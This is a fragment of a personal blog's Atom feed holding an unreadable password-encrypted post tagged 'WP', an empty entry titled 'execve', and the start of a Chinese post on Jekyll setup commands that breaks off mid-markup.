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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="WP" scheme="https://pz1o.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>execve</title>
    <link href="https://pz1o.top/2021/06/04/execve/"/>
    <id>https://pz1o.top/2021/06/04/execve/</id>
    <published>2021-06-04T11:17:07.000Z</published>
    <updated>2021-06-04T11:17:07.684Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>博客迁移</title>
    <link href="https://pz1o.top/2021/06/03/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
    <id>https://pz1o.top/2021/06/03/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</id>
    <published>2021-06-03T10:13:10.000Z</published>
    <updated>2021-06-09T11:45:08.520Z</updated>
    
    <content type="html"><![CDATA[<p>吃饱了撑的，我要换blog</p><a id="more"></a><p>还是不换了，jekyll居然不能加密。</p><h1 id="0x01-基础环境"><a href="#0x01-基础环境" class="headerlink" title="0x01 基础环境"></a>0x01 基础环境</h1><p>先下载ruby<a href="https://rubyinstaller.org/downloads/archives/" target="_blank" rel="noopener">Download Archives (rubyinstaller.org)</a></p><p>和gem<a href="https://rubygems.org/pages/download" target="_blank" rel="noopener">Download RubyGems | RubyGems.org | Ruby 社区 Gem 托管</a></p><p>然后解压gem</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby setup.rb</span><br><span class="line">gem install jekyll</span><br><span class="line">jekyll --version</span><br></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 